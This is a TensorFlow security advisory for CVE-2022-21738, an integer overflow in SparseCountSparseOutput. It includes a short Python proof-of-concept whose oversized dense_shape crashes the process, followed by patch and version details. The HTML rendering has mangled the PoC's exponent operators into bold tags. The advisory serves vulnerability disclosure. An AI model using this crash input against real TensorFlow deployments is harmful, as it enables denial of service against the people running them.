<h2>TFSA-2022-019: Integer overflow leading to crash in <code>SparseCountSparseOutput</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-21738</p>
<h3>Impact</h3>
<p>The <a href="https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/count_ops.cc#L168-L273">implementation of <code>SparseCountSparseOutput</code></a> can be made to crash a TensorFlow process by an integer overflow whose result is then used in a memory allocation:</p>
<p>```python
import tensorflow as tf
import numpy as np</p>
<p>tf.raw_ops.SparseCountSparseOutput(
  indices=[[1,1]],
  values=[2],
  dense_shape=[2 <strong> 31, 2 </strong> 32],
  weights=[1],
  binary_output=True,
  minlength=-1,
  maxlength=-1,
  name=None)
```</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a">6f4d3e8139ec724dbbcb40505891c81dd1052c4a</a>.</p>
<p>The fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.</p>
